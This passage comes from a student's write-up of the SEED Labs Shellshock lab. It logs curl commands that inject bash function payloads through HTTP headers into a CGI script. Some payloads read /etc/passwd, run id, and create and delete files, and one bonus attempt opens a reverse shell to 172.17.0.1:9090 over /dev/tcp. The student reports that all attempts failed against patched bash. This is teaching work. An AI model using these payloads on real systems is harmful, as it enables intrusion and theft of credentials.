...
[02/16/21]seed@VM:~/.../02_shellshock$ curl -H temp:'() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
...
```
The outputs were the same for all three.

2. repeated Task 3.2
```
[02/16/21]seed@VM:~/.../02_shellshock$ curl -H temp:'() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_TEMP=() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/id
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55794
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../02_shellshock$ curl -A '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/id' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```
The three were again the same.

3. repeated Task 3.3 and 3.4 since I need to do both of them to show all three options
```
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_REFERER=() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /tmp/test
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55802
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() {echo "passwords";}; echo Content_type: text/plain; echo "this is a test" > /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_REFERER=() {echo "passwords";}; echo Content_type: text/plain; echo "this is a test" > /tmp/test
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55804
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_REFERER=() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/cat /tmp/test
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55806
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
[02/16/21]seed@VM:~/.../02_shellshock$ curl -e '() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/rm /tmp/test' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=curl/7.68.0
HTTP_ACCEPT=*/*
HTTP_REFERER=() {echo "passwords";}; echo Content_type: text/plain; echo; /bin/rm /tmp/test
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55808
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
```
I am going to skip the other two option since it will be the same results, a list of all the environment variables.

4. **Bonus**, I decided to try Task 4:
```
[02/16/21]seed@VM:~/.../image_www$ nc -nvl 9090
Listening on 0.0.0.0 9090
```
```
[02/16/21]seed@VM:~/.../02_shellshock$ /bin/bash
[02/16/21]seed@VM:~/.../02_shellshock$ curl -A '() {:;}; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/172.17.0.1/9090 0<&1 2>&1' http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi
*** ENVIRONMENT VARIABLES***
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=() {:;}; echo Content_type: text/plain; echo; /bin/bash -i > /dev/tcp/172.17.0.1/9090 0<&1 2>&1
HTTP_ACCEPT=*/*
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)
SERVER_NAME=www.seedlab-shellshock.com
SERVER_ADDR=10.9.0.80
SERVER_PORT=80
REMOTE_ADDR=10.9.0.1
DOCUMENT_ROOT=/var/www/html
REQUEST_SCHEME=http
CONTEXT_PREFIX=/cgi-bin/
CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
SERVER_ADMIN=webmaster@localhost
SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi
REMOTE_PORT=55560
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
QUERY_STRING=
REQUEST_URI=/cgi-bin/getenv.cgi
SCRIPT_NAME=/cgi-bin/getenv.cgi
```
As we can see, task 4 has failed as well. Overall, we can see that we are running the actual getenv.cgi every time. Since the code asked for print the environ, that is our result. We have not gotten around it. Even after trying all curl options and doing something like task 4. However, it is also good to hear that such a vulnerable bug has been fixed and it was patched. In the end, it was very clear the difference between /bin/bash_shellshock and /bin/bash. 
